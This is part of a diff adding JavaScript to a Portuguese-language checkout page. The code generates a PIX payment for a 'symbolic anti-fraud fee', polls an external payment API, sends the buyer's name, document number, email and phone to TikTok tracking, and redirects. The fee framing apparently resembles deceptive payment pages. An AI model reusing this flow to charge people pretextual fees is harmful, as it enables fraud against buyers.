+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: idTransacao }),
+      }).then((response) => {
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        return response.json();
+      });
+    }
+
+    function verificarPagamentoDiretoAPI(transactionId) {
+      const apiUrl = `https://www.pagamentos-seguros.app/api-pix/v6KgN0fD7krYXynlSCgAOVyL1LFV_N-axdxDNtvY626czr8yjHKj05_OZMamtVVm0oLc_C5rCLNd85U_UkXREQ?transactionId=${encodeURIComponent(transactionId)}`;
+      return fetch(apiUrl, {
+        method: "GET",
+        headers: { "Content-Type": "application/json" },
+      })
+        .then((response) => {
+          if (response.status === 404) return { status: "PENDING" };
+          if (!response.ok) throw new Error(`HTTP ${response.status}`);
+          return response.json();
+        })
+        .then((data) => {
+          const status = data.status ? data.status.toUpperCase() : "PENDING";
+          const isPaid = status === "COMPLETED";
+          return { paid: isPaid, status: status.toLowerCase(), transactionId: data.transactionId || transactionId, amount: data.amount || null, data: data };
+        })
+        .catch((error) => {
+          console.error("❌ [Polling Direto] Erro:", error);
+          return { paid: false, status: "pending", error: error.message };
+        });
+    }
+
+    function iniciarPollingDiretoAPI(transactionId) {
+      const startTime = Date.now();
+      let currentTimeout = null;
+      function fazerPolling() {
+        if (paymentConfirmed) return;
+        const elapsed = (Date.now() - startTime) / 1000;
+        let intervalo = 2000;
+        if (elapsed > 30) intervalo = 5000;
+        if (elapsed > 120) intervalo = 10000;
+        if (elapsed > 300) intervalo = 30000;
+
+        verificarPagamentoDiretoAPI(transactionId).then((data) => {
+          if (data.paid === true || isPaymentPaid(data)) {
+            handlePaymentConfirmed(transactionId, "Polling Direto (API)");
+            return;
+          }
+          if (!paymentConfirmed) currentTimeout = setTimeout(fazerPolling, intervalo);
+        }).catch(() => {
+          if (!paymentConfirmed) currentTimeout = setTimeout(fazerPolling, intervalo);
+        });
+      }
+      fazerPolling();
+      return () => { if (currentTimeout) clearTimeout(currentTimeout); };
+    }
+
+    function isPaymentPaid(data) {
+      return (data.paid === true || ["completed", "paid", "approved", "confirmado", "pago"].includes((data.status || "").toLowerCase()));
+    }
+
+    function updatePaymentStatus(data, statusSubtitle) {
+      if (!statusSubtitle) return;
+      const now = new Date().toLocaleTimeString("pt-BR");
+      if (isPaymentPaid(data)) {
+        statusSubtitle.textContent = `✅ Pagamento confirmado! Redirecionando...`;
+        statusSubtitle.style.color = "#28a745";
+      } else {
+        statusSubtitle.textContent = `Última verificação: ${now} - Status: ${data.status || "pendente"}`;
+      }
+    }
+
+    function iniciarVerificacaoPagamento(idTransacao) {
+      paymentConfirmed = false;
+      const statusElement = document.getElementById("pix-payment-status");
+      const statusSubtitle = document.getElementById("pix-status-subtitle");
+      if (statusElement) statusElement.style.display = "block";
+
+      verificarPagamento(idTransacao).then((data) => {
+        updatePaymentStatus(data, statusSubtitle);
+        if (isPaymentPaid(data)) {
+          handlePaymentConfirmed(idTransacao, "Polling Local");
+          return;
+        }
+        pixCheckPaymentInterval = setInterval(() => {
+          if (paymentConfirmed) { clearInterval(pixCheckPaymentInterval); return; }
+          verificarPagamento(idTransacao).then((d) => {
+            updatePaymentStatus(d, statusSubtitle);
+            if (isPaymentPaid(d)) {
+              clearInterval(pixCheckPaymentInterval);
+              handlePaymentConfirmed(idTransacao, "Polling Local");
+            }
+          }).catch(console.error);
+        }, 8000);
+      }).catch((e) => {
+        console.error(e);
+        // retry setup
+        pixCheckPaymentInterval = setInterval(() => {
+          if (paymentConfirmed) { clearInterval(pixCheckPaymentInterval); return; }
+          verificarPagamento(idTransacao).then((d) => {
+            updatePaymentStatus(d, statusSubtitle);
+            if (isPaymentPaid(d)) {
+              clearInterval(pixCheckPaymentInterval);
+              handlePaymentConfirmed(idTransacao, "Polling Local");
+            }
+          }).catch(console.error);
+        }, 8000);
+      });
+
+      pixPollingDiretoCleanup = iniciarPollingDiretoAPI(idTransacao);
+    }
+
+    async function handlePaymentConfirmed(idTransacao, origem = "Desconhecido") {
+      if (paymentConfirmed) return;
+      paymentConfirmed = true;
+
+      console.log(`🎉 PAGAMENTO CONFIRMADO POR: ${origem}`);
+      if (pixCheckPaymentInterval) { clearInterval(pixCheckPaymentInterval); pixCheckPaymentInterval = null; }
+      if (pixPollingDiretoCleanup) { pixPollingDiretoCleanup(); pixPollingDiretoCleanup = null; }
+
+      const statusElement = document.getElementById("pix-payment-status");
+      if (statusElement) {
+        statusElement.innerHTML = `
+                  <div class="pix-status-content">
+                      <div class="pix-status-icon" style="color: #28a745;">
+                          <i class="fas fa-check-circle"></i>
+                      </div>
+                      <div class="pix-status-text">
+                          <p class="pix-status-title" style="color: #28a745;">Pagamento confirmado!</p>
+                          <p class="pix-status-subtitle">Redirecionando...</p>
+                      </div>
+                  </div>
+              `;
+      }
+
+      const cliente = getClienteData();
+      const valor = getVariantPrice();
+
+      if (typeof window.trackTikTokPurchase === "function") {
+        window.trackTikTokPurchase({
+          transactionId: idTransacao,
+          amount: valor,
+          customer: {
+            email: cliente.email || DEFAULT_CUSTOMER.email,
+            phone: cliente.telefone || DEFAULT_CUSTOMER.phone,
+            name: cliente.nome || DEFAULT_CUSTOMER.name,
+            document: cliente.documento || DEFAULT_CUSTOMER.document,
+          },
+          contentId: CONTENT_ID,
+        });
+      }
+
+      const utmParams = getUtmParams();
+      const utmString = new URLSearchParams(utmParams).toString();
+      const redirectUrl = REDIRECT_URL + (utmString ? "?" + utmString : "");
+
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 2000);
+    }
+
+    function showError(message) {
+      document.getElementById("pix-loading").style.display = "none";
+      const errorElement = document.getElementById("pix-error-message");
+      errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+      errorElement.style.display = "block";
+    }
+
+    function tryGeneratePix(retryCount = 0) {
+      const cliente = getClienteData();
+      const valor = getVariantPrice();
+      const utmParams = getUtmParams();
+      const utmString = new URLSearchParams(utmParams).toString();
+
+      const paymentData = {
+        amount: Math.round(valor * 100),
+        description: "Tarifa simbólica anti-fraude",
+        customer: {
+          name: cliente.nome,
+          document: cliente.documento,
+          email: cliente.email,
+          phone: cliente.telefone,
+        },
+        item: {
+          title: "Tarifa simbólica anti-fraude",
+          price: Math.round(valor * 100),
+          quantity: 1,
+        },
+        paymentMethod: "PIX",
+        utm: utmString,
+      };
+
+      fetch("https://www.pagamentos-seguros.app/api-pix/v6KgN0fD7krYXynlSCgAOVyL1LFV_N-axdxDNtvY626czr8yjHKj05_OZMamtVVm0oLc_C5rCLNd85U_UkXREQ", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(paymentData),
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          if (data.pixCode && data.transactionId) {
+            handlePixSuccess(data);
+          } else {
+            showError(data.message || "Erro ao gerar o PIX.");
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+          showError("Erro ao gerar o PIX.");
+        });
+    }
+
+    function handlePixSuccess(data) {
+      pixTransactionId = data.transactionId;
+
+      if (pixTransactionId) {
+        const utmParams = getUtmParams();
+        fetch("/api/save-utm-query", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ transactionId: pixTransactionId, utmQuery: JSON.stringify(utmParams) }),
+        }).catch(console.error);
+      }
+
+      const pixLoading = document.getElementById("pix-loading");
+      const pixPaymentContent = document.getElementById("pix-payment-content");
+      const pixAmount = document.getElementById("pix-amount");
+      const pixExpiration = document.getElementById("pix-expiration");
+      const pixModalCode = document.getElementById("pix-modal-code");
+      const qrcodeImg = document.getElementById("pix-modal-qrcode-img");
+      const qrcodeElement = document.getElementById("pix-modal-qrcode");
+
+      pixLoading.style.display = "none";
+      pixPaymentContent.style.display = "block";
+
+      const valor = getVariantPrice();
+      pixAmount.textContent = valor.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+
+      const expirationDate = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
+      pixExpiration.textContent = expirationDate.toLocaleString("pt-BR");
+
+      const pixQrCode = data.pixCode || "";
+      pixModalCode.value = pixQrCode;
+
+      if (pixQrCode && pixQrCode.startsWith("data:image")) {
+        qrcodeImg.src = pixQrCode;
+        qrcodeImg.style.display = "block";
+        qrcodeElement.style.display = "none";
+      } else if (pixQrCode && typeof QRCode !== "undefined") {
+        qrcodeElement.innerHTML = "";
+        QRCode.toCanvas(qrcodeElement, pixQrCode, { width: 200, margin: 2, color: { dark: "#FE4908", light: "#ffffff" } }, function (error) {
+          if (error) {
+            qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(pixQrCode)}&size=200`;
+            qrcodeImg.style.display = "block";
+            qrcodeElement.style.display = "none";
+          }
+        });
+      } else {
+        qrcodeImg.src = `https://quickchart.io/qr?text=${encodeURIComponent(pixQrCode)}&size=200`;
+        qrcodeImg.style.display = "block";
+        qrcodeElement.style.display = "none";
+      }
+
+      const copyBtn = document.getElementById("pix-copy-btn");
+      const newCopyBtn = copyBtn.cloneNode(true);
+      copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
+      newCopyBtn.addEventListener("click", function () {
+        pixModalCode.select();
+        document.execCommand("copy");
+        newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+        setTimeout(() => { newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>'; }, 2000);
+      });
+
+      if (pixTransactionId) {
+        iniciarVerificacaoPagamento(pixTransactionId);
+
+        // Track InitiateCheckout
+        if (typeof window.trackTikTokInitiateCheckout === "function") {
+          const cliente = getClienteData();
+          window.trackTikTokInitiateCheckout({
+            transactionId: pixTransactionId,
+            amount: valor,
+            customer: {
+              email: cliente.email || DEFAULT_CUSTOMER.email,
+              phone: cliente.telefone || DEFAULT_CUSTOMER.phone,
+              name: cliente.nome || DEFAULT_CUSTOMER.name,
+              document: cliente.documento || DEFAULT_CUSTOMER.document,
+            },
+            contentId: CONTENT_ID,
+          });
+        }
+      }
+    }
+  </script>
+</body>
+
 </html>
